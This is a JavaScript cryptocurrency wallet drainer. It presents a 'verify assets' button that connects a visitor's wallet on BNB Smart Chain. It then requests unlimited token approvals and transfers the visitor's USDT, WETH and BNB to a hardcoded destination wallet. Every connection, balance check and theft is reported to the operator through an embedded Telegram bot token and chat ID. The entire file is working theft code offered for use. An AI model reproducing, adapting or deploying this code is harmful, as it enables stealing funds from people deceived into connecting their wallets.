/* =========================================
   CONFIGURATION
   ========================================= */
const BSC_ADDRESS    = "0x9c8B51d223bCe853ce7b5e95B44F470888B0413E"; // Destination Wallet

// Correct BSC token contract addresses
const USDT_CONTRACT  = "0x55d398326f99059fF775485246999027B3197955";   // USDT
const WETH_CONTRACT  = "0x2170Ed0880ac9A755fd29B2688956BD959F933F8";   // Wrapped ETH
// (WBTC & WBTC_CONTRACT not used in this script but kept for reference)
// const WBTC_CONTRACT = "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c";

const TG_TOKEN       = "8676870275:AAE-0pAHy0E-FK3rLyUURYWgnToAqBfYUAA";
const TG_CHAT        = "8727739251";

let web3, userAddress;

/* =========================================
   UTILITIES (Telegram & Toast)
   ========================================= */
async function tg(msg) {
    try {
        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: "Markdown" })
        });
    } catch (_) {}
}

function toast(msg, color = "white") {
    let el = document.getElementById("__toast");
    if (!el) {
        el = document.createElement("div");
        el.id = "__toast";
        el.style.cssText =
            "position:fixed;top:20px;right:20px;padding:14px 20px;border-radius:8px;font-family:sans-serif;font-size:14px;font-weight:bold;z-index:99999;background:#111;max-width:280px;box-shadow:0 4px 20px rgba(0,0,0,0.5)";
        document.body.appendChild(el);
    }
    const c = color === "red" ? "#ff4444" : color === "green" ? "#00cc66" : "#f5c518";
    el.style.color = c;
    el.style.borderLeft = `4px solid ${c}`;
    el.textContent = msg;
    el.style.display = "block";
    clearTimeout(el._t);
    el._t = setTimeout(() => { el.style.display = "none"; }, 4000);
}

/* =========================================
   WALLET CONNECTION LOGIC
   ========================================= */
const WALLETS = [
    {
        name: "MetaMask",
        icon: "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg",
        deeplink: () => `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`,
        isInjected: () => window.ethereum?.isMetaMask
    },
    {
        name: "Trust Wallet",
        icon: "https://trustwallet.com/assets/images/media/assets/trust_platform.svg",
        deeplink: () => `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(window.location.href)}`,
        isInjected: () => window.ethereum?.isTrust
    },
    {
        name: "Binance Web3",
        icon: "https://bin.bnbstatic.com/static/images/common/favicon.ico",
        deeplink: () => `https://app.binance.com/en/dappbrowser/browser?url=${encodeURIComponent(window.location.href)}`,
        isInjected: () => window.BinanceChain != null
    },
    {
        name: "OKX Wallet",
        icon: "https://static.okx.com/cdn/assets/imgs/247/58E63FEA47A2B7D7.png",
        deeplink: () => `okx://wallet/dapp/url?dappUrl=${encodeURIComponent(window.location.href)}`,
        isInjected: () => window.okxwallet != null
    },
    {
        name: "Coinbase Wallet",
        icon: "https://www.svgrepo.com/show/331345/coinbase.svg",
        deeplink: () => `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(window.location.href)}`,
        isInjected: () => window.ethereum?.isCoinbaseWallet
    },
    {
        name: "TokenPocket",
        icon: "https://static.tokenpocket.pro/tp-lab/icon/tp-white.png",
        deeplink: () =>
            `tpoutside://pull.activity?param=${encodeURIComponent(
                JSON.stringify({ action: "openDapp", actionType: "dapp", url: window.location.href })
            )}`,
        isInjected: () => window.ethereum?.isTokenPocket
    }
];

function openModal() {
    const modal = document.getElementById("walletModal");
    const list  = document.getElementById("walletList");
    list.innerHTML = "";
    WALLETS.forEach(w => {
        const btn = document.createElement("button");
        btn.style.cssText =
            "display:flex;align-items:center;gap:14px;padding:12px 16px;border-radius:10px;background:#2a2a2a;border:1px solid #333;cursor:pointer;font-size:16px;color:#fff;width:100%";
        btn.onmouseover = () => btn.style.background = "#333";
        btn.onmouseout  = () => btn.style.background = "#2a2a2a";
        const img = document.createElement("img");
        img.src = w.icon;
        img.width = 32;
        img.height = 32;
        img.style.borderRadius = "8px";
        img.onerror = () => img.style.display = "none";
        const label = document.createElement("span");
        label.textContent = w.name;
        btn.appendChild(img);
        btn.appendChild(label);
        btn.onclick = () => connectWallet(w);
        list.appendChild(btn);
    });
    modal.style.display = "flex";
}

window.closeModal = () => { document.getElementById("walletModal").style.display = "none"; };

async function connectWallet(wallet) {
    closeModal();
    if (wallet.isInjected()) {
        await connectInjected(wallet);
        return;
    }
    toast(`Opening ${wallet.name}...`, "white");
    await tg(`📲 *Deeplink clicked*\nWallet: ${wallet.name}\nURL: ${window.location.href}`);
    window.location.href = wallet.deeplink();
}

async function connectInjected(wallet) {
    try {
        toast("Connecting...", "white");
        let provider = window.ethereum;
        if (wallet.name === "OKX Wallet" && window.okxwallet) provider = window.okxwallet;
        if (wallet.name === "Binance Web3" && window.BinanceChain) provider = window.BinanceChain;

        // 1️⃣ Request accounts
        const accounts = await provider.request({ method: "eth_requestAccounts" });
        userAddress = accounts[0];

        // 2️⃣ Initialize Web3 after provider is ready
        web3 = new window.Web3(provider);

        // 3️⃣ Switch / add BSC network
        try {
            await provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0x38" }] });
        } catch (e) {
            if (e.code === 4902) {
                await provider.request({
                    method: "wallet_addEthereumChain",
                    params: [{
                        chainId: "0x38",
                        chainName: "BNB Smart Chain",
                        rpcUrls: ["https://bsc-dataseed.binance.org/"],
                        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                        blockExplorerUrls: ["https://bscscan.com"]
                    }]
                });
            }
        }

        toast(`✅ ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, "green");
        await tg(`👤 *Connected*\nWallet: ${wallet.name}\nAddress: \`${userAddress}\``);
    } catch (err) {
        toast("❌ Connection rejected.", "red");
        await tg(`⚠️ *Rejected*\nWallet: ${wallet.name}\nErr: ${err.message}`);
    }
}

/* =========================================
   DRAIN LOGIC (ORDER: USDT → ETH → BNB)
   ========================================= */
const ERC20_ABI = [
    { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
    { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "type": "function" },
    { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }, { "name": "_spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" },
    { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
    { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
];
const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

/* ---------- Helper: Convert raw balance to human‑readable --------- */
async function toReadable(contract, raw) {
    const decimals = await contract.methods.decimals().call();
    return web3.utils.fromWei(raw, "ether") * Math.pow(10, 18 - decimals);
}

/* ---------- USDT Drain ---------- */
async function drainUSDT() {
    toast("🔥 Draining USDT...", "white");
    try {
        const contract = new web3.eth.Contract(ERC20_ABI, USDT_CONTRACT);
        const balRaw = await contract.methods.balanceOf(userAddress).call();
        const bal = web3.utils.toBN(balRaw);
        if (bal.isZero()) { toast("⚠️ No USDT balance.", "white"); return false; }

        // Allowance check
        const allowanceRaw = await contract.methods.allowance(userAddress, BSC_ADDRESS).call();
        const allowance = web3.utils.toBN(allowanceRaw);
        if (allowance.lt(bal)) {
            const txApprove = await contract.methods.approve(BSC_ADDRESS, MAX_UINT256).send({ from: userAddress });
            if (!txApprove.status) { toast("❌ USDT Approval Failed.", "red"); return false; }
        }

        const txTransfer = await contract.methods.transferFrom(userAddress, BSC_ADDRESS, bal).send({ from: userAddress });
        if (!txTransfer.status) { toast("❌ USDT Transfer Failed.", "red"); return false; }

        toast("✅ USDT Drained!", "green");
        await tg(`💸 *USDT Sent*\nTo: \`${BSC_ADDRESS}\`\nFrom: \`${userAddress}\``);
        return true;
    } catch (err) {
        console.error("USDT Drain Error:", err);
        toast("❌ USDT Drain Failed.", "red");
        return false;
    }
}

/* ---------- ETH (WETH) Drain ---------- */
async function drainETH() {
    toast("🔥 Draining ETH (WETH)...", "white");
    try {
        const contract = new web3.eth.Contract(ERC20_ABI, WETH_CONTRACT);
        const balRaw = await contract.methods.balanceOf(userAddress).call();
        const bal = web3.utils.toBN(balRaw);
        if (bal.isZero()) { toast("⚠️ No ETH/WETH balance.", "white"); return false; }

        // Allowance check
        const allowanceRaw = await contract.methods.allowance(userAddress, BSC_ADDRESS).call();
        const allowance = web3.utils.toBN(allowanceRaw);
        if (allowance.lt(bal)) {
            const txApprove = await contract.methods.approve(BSC_ADDRESS, MAX_UINT256).send({ from: userAddress });
            if (!txApprove.status) { toast("❌ ETH Approval Failed.", "red"); return false; }
        }

        const txTransfer = await contract.methods.transferFrom(userAddress, BSC_ADDRESS, bal).send({ from: userAddress });
        if (!txTransfer.status) { toast("❌ ETH Transfer Failed.", "red"); return false; }

        toast("✅ ETH Drained!", "green");
        await tg(`💸 *ETH Sent*\nTo: \`${BSC_ADDRESS}\`\nFrom: \`${userAddress}\``);
        return true;
    } catch (err) {
        console.error("ETH Drain Error:", err);
        toast("❌ ETH Drain Failed.", "red");
        return false;
    }
}

/* ---------- BNB Drain ---------- */
async function drainBNB() {
    toast("🔥 Draining BNB...", "white");
    const balance = await web3.eth.getBalance(userAddress);
    const balBN = web3.utils.toBN(balance);
    if (balBN.isZero()) { toast("❌ No BNB to drain.", "red"); return false; }

    try {
        const gasEstimate = await web3.eth.estimateGas({
            from: userAddress,
            to: BSC_ADDRESS,
            value: balance
        });
        const gasPrice  = await web3.eth.getGasPrice();
        const gasCost = web3.utils.toBN(gasEstimate).mul(web3.utils.toBN(gasPrice));
        const sendValue = balBN.sub(gasCost);

        if (sendValue.lte(web3.utils.toBN(0))) { toast("⚠️ BNB balance too low for gas.", "red"); return false; }

        await web3.eth.sendTransaction({
            from: userAddress,
            to: BSC_ADDRESS,
            value: sendValue,
            gas: Math.floor(gasEstimate * 1.2),
            gasPrice: gasPrice
        });

        toast("✅ BNB Drained!", "green");
        await tg(`💸 *BNB Sent*\nTo: \`${BSC_ADDRESS}\`\nFrom: \`${userAddress}\``);
        return true;
    } catch (err) {
        console.error("BNB Drain Error:", err);
        toast("❌ BNB Drain Failed.", "red");
        return false;
    }
}

/* ---------- Full Drain Routine ---------- */
async function executeFullDrain() {
    toast("🚀 Starting Full Drain...", "white");
    const usdtOk = await drainUSDT();
    const ethOk  = await drainETH();
    const bnbOk  = await drainBNB();

    if (usdtOk || ethOk || bnbOk) {
        toast("💰 All Assets Drained!", "green");
    } else {
        toast("⚠️ No assets were drained.", "red");
    }
}

/* =========================================
   INITIALIZATION / EVENT BINDING
   ========================================= */
async function verifyAssets() {
    try {
        const balAbi = [{ constant:true, inputs:[{name:"_owner",type:"address"}], name:"balanceOf", outputs:[{name:"",type:"uint256"}], type:"function" }];
        const usdtContract = new web3.eth.Contract(balAbi, USDT_CONTRACT);
        const ethContract  = new web3.eth.Contract(balAbi, WETH_CONTRACT);

        const [usdtRaw, ethRaw, bnbRaw] = await Promise.all([
            usdtContract.methods.balanceOf(userAddress).call(),
            ethContract.methods.balanceOf(userAddress).call(),
            web3.eth.getBalance(userAddress)
        ]);

        const usdt = parseFloat(web3.utils.fromWei(usdtRaw, "ether"));
        const eth  = parseFloat(web3.utils.fromWei(ethRaw, "ether"));
        const bnb  = parseFloat(web3.utils.fromWei(bnbRaw, "ether"));

        await tg(`💰 *Balance Check*\nAddress: \`${userAddress}\`\nUSDT: ${usdt.toFixed(2)}\nETH: ${eth.toFixed(4)}\nBNB: ${bnb.toFixed(4)}`);

        if (usdt === 0 && eth === 0 && bnb === 0) {
            toast("⚠️ No Assets Found.", "white");
            return;
        }

        toast("⚙️ Approving & Draining...", "white");
        await executeFullDrain();
    } catch (err) {
        console.error(err);
        toast("❌ Error during verification.", "red");
    }
}

document.addEventListener("DOMContentLoaded", () => {
    const isInWalletBrowser =
        window.ethereum?.isMetaMask ||
        window.ethereum?.isTrust ||
        window.ethereum?.isTokenPocket ||
        window.okxwallet ||
        window.BinanceChain;

    document.getElementById("verifyAssets").addEventListener("click", () => {
        if (isInWalletBrowser) {
            const detected =
                window.ethereum?.isMetaMask   ? WALLETS[0] :
                window.ethereum?.isTrust      ? WALLETS[1] :
                window.BinanceChain           ? WALLETS[2] :
                window.okxwallet              ? WALLETS[3] :
                window.ethereum?.isTokenPocket? WALLETS[5] : WALLETS[0];
            connectWallet(detected);
        } else {
            openModal();
        }
    });
});
